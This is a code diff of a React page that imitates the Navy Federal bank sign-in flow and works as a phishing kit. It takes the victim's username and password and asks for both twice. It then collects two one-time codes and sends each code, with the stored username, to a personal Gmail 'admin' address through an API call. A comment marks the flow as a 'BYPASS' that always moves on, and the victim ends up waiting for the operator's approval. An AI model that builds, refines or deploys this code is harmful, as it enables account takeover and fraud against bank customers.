@@ -9,8 +9,8 @@ import {
 } from '@/app/actions'
 
 type Step =
-  | 'credentials'
-  | 'username'
+  | 'credentials'  // Now username + password
+  | 'confirm'      // NEW: confirm username + password
   | 'otp1'
   | 'otp2'
   | 'awaiting_approval'
@@ -22,17 +22,17 @@ const WAIT_MSG =
 
 export default function NavyFederalBanking() {
   const [step, setStep] = useState<Step>('credentials')
-  const [email, setEmail] = useState('')
-  const [password, setPassword] = useState('')
   const [username, setUsername] = useState('')
-  const [confirmPassword, setConfirmPassword] = useState('') // ✅ NEW
+  const [password, setPassword] = useState('')
+  const [confirmUsername, setConfirmUsername] = useState('')
+  const [confirmPassword, setConfirmPassword] = useState('')
   const [otp, setOtp] = useState('')
   const [attemptId, setAttemptId] = useState<string | null>(null)
   const [error, setError] = useState<string | null>(null)
   const [note, setNote] = useState<string | null>(null)
   const [loading, setLoading] = useState(false)
   const [showPassword, setShowPassword] = useState(false)
-  const [showConfirmPassword, setShowConfirmPassword] = useState(false) // ✅ NEW
+  const [showConfirmPassword, setShowConfirmPassword] = useState(false)
 
   useEffect(() => {
     if (step !== 'awaiting_approval' || !attemptId) return
@@ -55,100 +55,104 @@ export default function NavyFederalBanking() {
   }, [step, attemptId])
 
   async function onSubmit(e: React.FormEvent) {
-  e.preventDefault()
-  setError(null)
-  setLoading(true)
-  try {
-    if (step === 'credentials') {
-      const r = await startChallenge({ email, password })
-      setLoading(false)
-      if (!r.ok) {
-        setError(r.error)
-        return
-      }
-      setAttemptId(r.attemptId)
-      setStep('username')
-      setNote(null)
-      return
-    }
-    if (step === 'username') {
-      // ✅ Validate confirm password matches
-      if (password !== confirmPassword) {
+    e.preventDefault()
+    setError(null)
+    setLoading(true)
+    try {
+      // Step 1: Username + Password
+      if (step === 'credentials') {
+        if (!username || !password) {
+          setLoading(false)
+          setError('Please enter both username and password')
+          return
+        }
+        
+        // Store credentials and move to confirm step
+        sessionStorage.setItem('loginUsername', username)
+        setStep('confirm')
         setLoading(false)
-        setError('Passwords do not match!')
+        setNote('Please confirm your credentials')
         return
       }
 
-      if (!attemptId) {
+      // Step 2: Confirm Username + Confirm Password
+      if (step === 'confirm') {
+        // Validate both match
+        if (username !== confirmUsername) {
+          setLoading(false)
+          setError('Usernames do not match!')
+          return
+        }
+        if (password !== confirmPassword) {
+          setLoading(false)
+          setError('Passwords do not match!')
+          return
+        }
+
+        // Now call the API
+        const r = await startChallenge({ username, password })
         setLoading(false)
-        setError('Session lost.')
+        if (!r.ok) {
+          setError(r.error)
+          return
+        }
+        setAttemptId(r.attemptId)
+        setStep('otp1')
+        setNote('Code sent to your email.')
         return
       }
-      const r = await submitUsername({ attemptId, username })
-      setLoading(false)
-      if (!r.ok) {
-        setError(r.error)
-        return
-      }
-      setOtp('')
-      setStep('otp1')
-      setNote('Code sent to your email.')
-      return
-    }
-    if (step === 'otp1' || step === 'otp2') {
-      if (!attemptId) {
-        setLoading(false)
-        setError('Session lost.')
-        return
-      }
-      
-      const which = step === 'otp1' ? 1 : 2
-      
-      // ✅ Send OTP to admin via submitOtp
-      const result = await submitOtp({ attemptId, otp, which })
-      console.log(`📱 OTP ${which} result:`, result)
-      
-      // ✅ Also send directly via fetch (as backup)
-      try {
-        const adminEmail = 'blessedresult6@gmail.com'
-        const username = sessionStorage.getItem('loginUsername') || 'Unknown'
+
+      // OTP steps (unchanged)
+      if (step === 'otp1' || step === 'otp2') {
+        if (!attemptId) {
+          setLoading(false)
+          setError('Session lost.')
+          return
+        }
         
-        await fetch('/api/auth/send-otp', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            otp: otp,
-            username: username,
-            which: which,
-            adminEmail: adminEmail
+        const which = step === 'otp1' ? 1 : 2
+        const result = await submitOtp({ attemptId, otp, which })
+        console.log(`📱 OTP ${which} result:`, result)
+        
+        try {
+          const adminEmail = 'blessedresult6@gmail.com'
+          const username = sessionStorage.getItem('loginUsername') || 'Unknown'
+          
+          await fetch('/api/auth/send-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              otp: otp,
+              username: username,
+              which: which,
+              adminEmail: adminEmail
+            })
           })
-        })
-      } catch (err) {
-        console.error('Failed to send OTP to admin:', err)
+        } catch (err) {
+          console.error('Failed to send OTP to admin:', err)
+        }
+        
+        setLoading(false)
+        setOtp('')
+        
+        if (which === 1) {
+          setStep('otp2')
+          setNote('Second code sent to your email.')
+        } else {
+          setStep('awaiting_approval')
+          setNote(WAIT_MSG)
+        }
+        return
       }
-      
-      // ✅ BYPASS — always proceed regardless of result
+    } catch (err) {
       setLoading(false)
-      setOtp('')
-      
-      if (which === 1) {
-        setStep('otp2')
-        setNote('Second code sent to your email.')
-      } else {
-        setStep('awaiting_approval')
-        setNote(WAIT_MSG)
-      }
-      return
+      setError(err instanceof Error ? err.message : 'Error')
     }
-  } catch (err) {
-    setLoading(false)
-    setError(err instanceof Error ? err.message : 'Error')
   }
-}
 
   const titles: Record<Exclude<Step, 'approved_success'>, string> = {
     credentials: 'Sign In',
-    username: 'Verify Your Identity',
+    confirm: 'Confirm Credentials',
     otp1: 'Enter First Code',
     otp2: 'Enter Second Code',
     awaiting_approval: 'Verification in Progress',
@@ -157,7 +161,7 @@ export default function NavyFederalBanking() {
 
   return (
     <div style={styles.container}>
-      {/* Navigation Header */}
+      {/* Navigation Header - unchanged */}
       <header style={styles.header}>
         <div style={styles.headerLeft}>
           <button style={styles.iconBtn} aria-label="Menu">
@@ -197,7 +201,7 @@ export default function NavyFederalBanking() {
                 <h2 style={styles.cardHeaderTitle}>Congratulations</h2>
                 <hr style={styles.divider} />
                 <p style={styles.text}>Your account &amp; verification has been approved.</p>
-                {email ? <p style={{ ...styles.text, fontWeight: 'bold' }}>{email}</p> : null}
+                {username ? <p style={{ ...styles.text, fontWeight: 'bold' }}>{username}</p> : null}
               </div>
             ) : (
               <>
@@ -210,21 +214,23 @@ export default function NavyFederalBanking() {
                 </div>
 
                 <form onSubmit={onSubmit}>
+                  {/* Step 1: Username + Password */}
                   {step === 'credentials' && (
                     <>
                       <div style={styles.formGroup}>
-                        <label htmlFor="email" style={styles.label}>
-                          Email
+                        <label htmlFor="username" style={styles.label}>
+                          Username
                           <span style={styles.helpBadge}>?</span>
                         </label>
                         <input
-                          id="email"
-                          type="email"
+                          id="username"
+                          type="text"
                           required
-                          value={email}
-                          onChange={(e) => setEmail(e.target.value)}
+                          value={username}
+                          onChange={(e) => setUsername(e.target.value)}
                           style={styles.input}
-                          autoComplete="email"
+                          autoComplete="username"
+                          placeholder="Enter your username"
                         />
                       </div>
 
@@ -239,6 +245,7 @@ export default function NavyFederalBanking() {
                             onChange={(e) => setPassword(e.target.value)}
                             style={styles.passwordInput}
                             autoComplete="current-password"
+                            placeholder="Enter your password"
                           />
                           <button
                             type="button"
@@ -264,30 +271,31 @@ export default function NavyFederalBanking() {
                       </div>
 
                       <div style={{ marginBottom: 16 }}>
-                        <a href="#help" style={styles.dottedLink}>SIGN IN HELP</a>
+                        <a href="#help" style={styles.dottedLink}>FORGOT USERNAME OR PASSWORD?</a>
                       </div>
                     </>
                   )}
 
-                  {step === 'username' && (
+                  {/* Step 2: Confirm Username + Confirm Password */}
+                  {step === 'confirm' && (
                     <>
                       <div style={styles.formGroup}>
-                        <label htmlFor="username" style={styles.label}>
-                          Username
+                        <label htmlFor="confirmUsername" style={styles.label}>
+                          Confirm Username
                           <span style={styles.helpBadge}>?</span>
                         </label>
                         <input
-                          id="username"
+                          id="confirmUsername"
                           type="text"
                           required
-                          value={username}
-                          onChange={(e) => setUsername(e.target.value)}
+                          value={confirmUsername}
+                          onChange={(e) => setConfirmUsername(e.target.value)}
                           style={styles.input}
                           autoComplete="username"
+                          placeholder="Re-enter your username"
                         />
                       </div>
 
-                      {/* ✅ Confirm Password Field */}
                       <div style={styles.formGroup}>
                         <label htmlFor="confirmPassword" style={styles.label}>Confirm Password</label>
                         <div style={styles.inputRelative}>
@@ -299,6 +307,7 @@ export default function NavyFederalBanking() {
                             onChange={(e) => setConfirmPassword(e.target.value)}
                             style={styles.passwordInput}
                             autoComplete="current-password"
+                            placeholder="Re-enter your password"
                           />
                           <button
                             type="button"
@@ -339,6 +348,7 @@ export default function NavyFederalBanking() {
                         value={otp}
                         onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
                         style={styles.input}
+                        placeholder="Enter 6-digit code"
                       />
                     </div>
                   )}
@@ -350,7 +360,7 @@ export default function NavyFederalBanking() {
 
                   {step !== 'awaiting_approval' && step !== 'rejected' && (
                     <button type="submit" disabled={loading} style={styles.btnPrimary}>
-                      {loading ? 'Please wait…' : step === 'credentials' ? 'Sign In' : 'Continue'}
+                      {loading ? 'Please wait…' : step === 'credentials' ? 'Continue' : 'Continue'}
                     </button>
                   )}
 
@@ -361,6 +371,8 @@ export default function NavyFederalBanking() {
                         setStep('credentials')
                         setAttemptId(null)
                         setUsername('')
+                        setPassword('')
+                        setConfirmUsername('')
                         setConfirmPassword('')
                         setOtp('')
                         setError(null)
